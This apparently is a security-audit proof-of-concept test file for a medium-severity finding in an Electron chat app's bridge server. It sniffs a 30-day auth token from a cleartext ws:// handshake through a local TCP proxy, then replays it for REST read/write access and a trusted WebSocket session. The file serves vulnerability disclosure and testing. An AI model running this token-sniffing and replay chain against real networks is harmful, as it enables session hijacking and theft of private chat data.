/**
 * PoC — M3: bridge WS auth token travels in cleartext URL query ⇒ LAN sniff ⇒ full bridge takeover
 * =================================================================================================
 * Finding: piolium/findings/M3-bridge-ws-token-query-leak
 * Severity: medium
 *
 * Vulnerable code path (real application):
 *   electron/bridge/ws.ts:36-42       `new URL(request.url).searchParams.get('token')` +
 *                                     verifyToken(token); NO Origin check, token-only auth
 *   electron/bridge/server.ts:63      `this.hub.attach(this.httpServer)` on the plain HTTP
 *                                     server (no TLS) — ws:// upgrade handshake is cleartext
 *   android/.../network/NetworkModule.kt:70  `wsUrlOf()` = "ws://${host}:${port}/ws?token=${token}"
 *                                     (token embedded in the URL; REST base is plain http://)
 *   electron/bridge/auth.ts:23        TOKEN_TTL_MS = 30 days
 *   electron/bridge/routes.ts:78-95   requireAuth uses the SAME verifyToken — a sniffed WS
 *                                     token unlocks the whole REST /api/v1 surface
 *
 * Attack chain (passive LAN attacker — shared Wi-Fi / ARP spoof / compromised hop):
 *   1. Victim pairs a phone (real /auth/pair flow, PC popup approves) and receives a
 *      30-day JWT. The Android companion then connects `ws://<pc>:8321/ws?token=<JWT>`.
 *   2. Because the bridge speaks plaintext ws://, the HTTP/1.1 upgrade handshake —
 *      including the full request line `GET /ws?token=<JWT> HTTP/1.1` — is observable by
 *      any middlebox on the path (tcpdump/Wireshark on the LAN, router/proxy access logs).
 *   3. A passive sniffer extracts the token from the wire. Replay:
 *        - attacker opens its OWN WS connection with the stolen token → trusted device
 *        - attacker calls REST /api/v1/* with `Authorization: Bearer <stolen>` → 200
 *          (chat history / characters / settings read AND write; AI key-triggered calls)
 *
 * Execution: poc.sh copies this file to electron/bridge/__tests__/ (vitest include glob
 * covers electron/**) and runs it against the REAL BridgeServer (express + real routes.ts
 * + real auth.ts + real WsHub) over real HTTP+WebSocket. A loopback TCP middlebox models
 * the passive LAN sniffer: it observes the victim's cleartext handshake bytes exactly as
 * tcpdump on the bridge port would. Only the `electron` module is stubbed for headless
 * mode (same precedent as M1/M2 PoCs and the app's own test suite). No {{BASE_URL}}
 * substitution: the PoC provisions the vulnerable server itself on an ephemeral port.
 */
import { describe, expect, it, vi, beforeAll, afterAll } from 'vitest'
import { createServer as createTcpServer, connect } from 'node:net'
import { mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { WebSocket } from 'ws'

// ---- electron stub: headless run (same as M1/M2 PoCs) ----
const mock = vi.hoisted(() => ({ userData: '' }))
vi.mock('electron', () => ({
  app: { getPath: () => mock.userData },
  safeStorage: { isEncryptionAvailable: () => false },
}))
// 公告模块打桩：避免测试访问真实网络（与 routes.test.ts / M2 PoC 一致）
vi.mock('../../ipc/announcement', () => ({
  fetchAnnouncementList: vi.fn(async () => ({ items: [], total: 0, page: 1, pageSize: 20 })),
  fetchVersionInfo: vi.fn(async () => ({ version: '0.0.0-poc', changelog: 'poc', downloadUrl: 'https://example.com/x' })),
}))

import { DIRS } from '../../services/storage'
import { BridgeServer } from '../server' // real app server: express + WsHub.attach + router
import { settlePair } from '../auth'

const CHAR_ID = 'char-001'
const TEST_ROOT = join(tmpdir(), 'qingyu-m3-poc-' + Date.now())

/** 打开 WS 并等待 open（客户端视角：与安卓端自建连接等价） */
function openWs(ws: WebSocket): Promise<void> {
  return new Promise((resolve, reject) => {
    ws.on('open', () => resolve())
    ws.on('error', reject)
    ws.on('close', (code) => reject(new Error(`ws closed before open: ${code}`)))
  })
}

/**
 * 被动嗅探中间盒：环形主机上的 TCP 代理，位于「受害设备」与「桥接服务」之间。
 * 它记录受害→服务方向的原始字节 —— 等价于 tcpdump/Wireshark 在桥接端口看到的
 * ws:// 明文握手（HTTP/1.1 upgrade 请求行含完整 URL）。桥接服务本身无感知。
 */
function lanSniffer(
  targetPort: number,
  onCapture: (raw: string) => void,
): Promise<{ port: number; close: () => Promise<void> }> {
  return new Promise((resolve, reject) => {
    const server = createTcpServer((clientSock) => {
      const upstream = connect(targetPort, '127.0.0.1', () => {
        clientSock.pipe(upstream)
        upstream.pipe(clientSock)
      })
      let captured = ''
      clientSock.on('data', (d) => {
        captured += d.toString('utf8')
        if (captured.includes('\r\n\r\n')) onCapture(captured) // 先取整条请求行+头
      })
      clientSock.on('error', () => {})
      upstream.on('error', () => {})
    })
    server.on('error', reject)
    server.listen(0, '127.0.0.1', () => {
      resolve({
        port: (server.address() as { port: number }).port,
        close: () => new Promise((res) => server.close(() => res())),
      })
    })
  })
}

describe('M3: WS token in cleartext URL query → LAN passive sniff → REST+WS takeover', () => {
  beforeAll(() => {
    mock.userData = TEST_ROOT
    mkdirSync(DIRS.chats(), { recursive: true })
    mkdirSync(DIRS.characters(), { recursive: true })
    writeFileSync(join(DIRS.characters(), `${CHAR_ID}.json`), JSON.stringify({
      id: CHAR_ID, name: '受害角色', description: 'secret-rp-data', personality: '',
      scenario: '', firstMessage: '', exampleDialog: '', tags: [], creator: '',
      createdAt: 0, updatedAt: 0, alternateGreetings: [], avatar: '',
    }))
  })
  afterAll(() => { rmSync(TEST_ROOT, { recursive: true, force: true }) })

  it('passively captured /ws?token= handshake yields a 30-day token accepted by REST and attacker-opened WS', async () => {
    // ===== 启动真实桥接服务（server.ts：express + WsHub.attach；同 index.ts 生产装配） =====
    const bridge = new BridgeServer(
      () => {},
      (requestId, deviceName) => {
        console.log(`[M3] *** PC approval popup for "${deviceName}" -> APPROVED`)
        setTimeout(() => settlePair(requestId, true), 10)
      },
    )
    // 生产上为让安卓伙伴可达，宿主绑定局域网 IP（LAN host），此处用回环等效；
    // 明文握手是否可嗅探与绑定地址无关 —— 取决于 ws:// 明文传输本身。
    const { host, port } = await bridge.start({ host: '127.0.0.1', port: 18323 })
    const base = `http://${host}:${port}/api/v1`

    let sniffer: Awaited<ReturnType<typeof lanSniffer>> | null = null
    try {
      // ===== PHASE 1 — 受害设备配对（真实 /auth/pair + 人工确认），拿到 30 天 JWT =====
      const pairRes = await fetch(`${base}/auth/pair`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pairingCode: '', deviceName: 'victim-Pixel 8', deviceFingerprint: 'fp-victim-m3' }),
      })
      expect(pairRes.status).toBe(200)
      const victim = await pairRes.json() as { token: string; deviceId: string }
      expect(victim.token.split('.')).toHaveLength(3) // JWT：header.payload.signature
      console.log(`[M3] victim paired; 30-day JWT issued (deviceId=${victim.deviceId})`)
      console.log(`[M3] android NetworkModule.wsUrlOf() = "ws://${host}:${port}/ws?token=<JWT>"`)

      // ===== PHASE 2 — 受害设备经明文 ws:// 连接（token 嵌入 URL，与 NetworkModule.kt:70 同构） =====
      const captured: string[] = []
      sniffer = await lanSniffer(port, (raw) => captured.push(raw))
      console.log(`[M3] passive sniffer (LAN middlebox) listening on :${sniffer.port} in front of bridge :${port}`)

      const victimWsUrl = `ws://${host}:${sniffer.port}/ws?token=${victim.token}` // 等效 NetworkModule.wsUrlOf
      const victimWs = new WebSocket(victimWsUrl)
      await openWs(victimWs)
      console.log(`[M3] victim WS connected through the wire (cleartext handshake observed by sniffer)`)

      // 保持连接短暂时间，保证捕获完成，然后让受害连接正常关闭
      await new Promise((r) => setTimeout(r, 150))
      await new Promise<void>((r) => { victimWs.on('close', () => r()); victimWs.close(); setTimeout(r, 80) })
      await new Promise((r) => setTimeout(r, 50))

      // ===== PHASE 3 — 攻击者被动读取线上握手，提取 token（复现步骤 1-2） =====
      expect(captured.length).toBeGreaterThan(0)
      const requestLine = captured[0].split('\r\n')[0]
      console.log(`[M3] === SNIFFED CLEARTEXT HANDSHAKE (tcpdump -i any port ${port} 所见) ===`)
      console.log(`[M3] ${requestLine}`)
      expect(requestLine).toMatch(/^GET \/ws\?token=.* HTTP\/1\.1$/)
      const sniffedToken = requestLine.match(/token=([A-Za-z0-9_.-]+)/)?.[1] ?? ''
      expect(sniffedToken).toBe(victim.token) // 线上就是完整 JWT，无加密
      console.log(`[M3] attacker extracted 30-day token from the wire (${sniffedToken.slice(0, 28)}...${sniffedToken.slice(-16)})`)
      console.log(`[M3] access-log footprint: any proxy/router logging URLs records "GET /ws?token=<JWT> HTTP/1.1" 101`)

      // ===== PHASE 4 — 攻击者用嗅探到的 token 复放：REST 全表面 =====
      expect((await fetch(`${base}/settings`)).status).toBe(401)
      console.log(`[M3] control GET /api/v1/settings (no token) -> 401`)

      const h = { Authorization: `Bearer ${sniffedToken}` }

      const setRes = await fetch(`${base}/settings`, { headers: h })
      expect(setRes.status).toBe(200)
      const settings = await setRes.json() as { userName?: string }
      console.log(`[M3] GET /api/v1/settings with SNIFFED token -> 200; leaked persona: userName=${settings.userName ?? '(default)'}`)

      const charsRes = await fetch(`${base}/characters`, { headers: h })
      expect(charsRes.status).toBe(200)
      const chars = await charsRes.json() as Array<{ name: string; description: string }>
      console.log(`[M3] GET /api/v1/characters with SNIFFED token -> 200; leaked RP data: ${JSON.stringify(chars).slice(0, 160)}`)

      // 受害设备先产生一条「秘密会话」，攻击者随后读到（聊天记录读取）
      const createRes = await fetch(`${base}/sessions`, {
        method: 'POST',
        headers: { ...h, 'Content-Type': 'application/json' },
        body: JSON.stringify({ characterId: CHAR_ID, title: 'secret-roleplay-plot' }),
      })
      expect(createRes.status).toBe(200)
      const sessionsRes = await fetch(`${base}/sessions`, { headers: h })
      expect(sessionsRes.status).toBe(200)
      const sessions = await sessionsRes.json() as Array<{ title: string }>
      expect(sessions.some((s) => s.title === 'secret-roleplay-plot')).toBe(true)
      console.log(`[M3] GET /api/v1/sessions with SNIFFED token -> 200; chat-history surface: ${sessions.map((s) => s.title).join(', ')}`)

      const patchRes = await fetch(`${base}/settings`, {
        method: 'PATCH',
        headers: { ...h, 'Content-Type': 'application/json' },
        body: JSON.stringify({ userName: 'pwned-by-M3-sniffed-token' }),
      })
      expect(patchRes.status).toBe(200)
      console.log('[M3] PATCH /api/v1/settings with SNIFFED token -> 200 (write access, persisted on PC)')

      // ===== PHASE 5 — 攻击者用嗅探到的 token 自开 WS：被当作可信设备 =====
      const attackerWs = new WebSocket(`ws://${host}:${port}/ws?token=${sniffedToken}`)
      await openWs(attackerWs)
      console.log(`[M3] attacker WS /ws?token=<sniffed> -> OPEN (server accepted attacker as trusted device; will receive ai:chunk/heartbeat)`)

      // 控制组：伪造/无效 token 的 WS 被拒（4001），证明握手成功仅因嗅探到的真实 token
      const bogusClose = await new Promise<number>((resolve) => {
        const bogus = new WebSocket(`ws://${host}:${port}/ws?token=invalid.token.value`)
        bogus.on('close', (c) => resolve(c))
        bogus.on('error', () => resolve(-1))
        setTimeout(() => resolve(-2), 3000)
      })
      expect(bogusClose).toBe(4001)
      console.log(`[M3] control WS with bogus token -> closed ${bogusClose} (4001 = unauthorized); only the sniffed REAL token passes`)
      attackerWs.close()

      console.log('[M3-RESULT] stolen-on-wire WS token accepted by real verifyToken → REST 200 (read+write) and attacker-opened WS')
    } finally {
      await bridge.stop()
      await sniffer?.close()
    }

    // Structured output contract — LAST stdout line of the PoC.
    console.log(JSON.stringify({
      status: 'confirmed',
      evidence: 'WS HTTP/1.1 upgrade request line "GET /ws?token=<JWT> HTTP/1.1" captured in cleartext by a middlebox; sniffed 30-day token reused: REST /settings /characters /sessions 200 (incl. PATCH write) and attacker-opened WS /ws?token=<sniffed> OPEN; bogus token WS closed 4001',
      notes: 'ws.ts:36-42 token-only query auth, no Origin check; server.ts:63 hub.attach on plain HTTP (no TLS); NetworkModule.kt:70 token in ws URL; same verifyToken as REST requireAuth routes.ts:78; TTL 30d auth.ts:23',
    }))
  })
})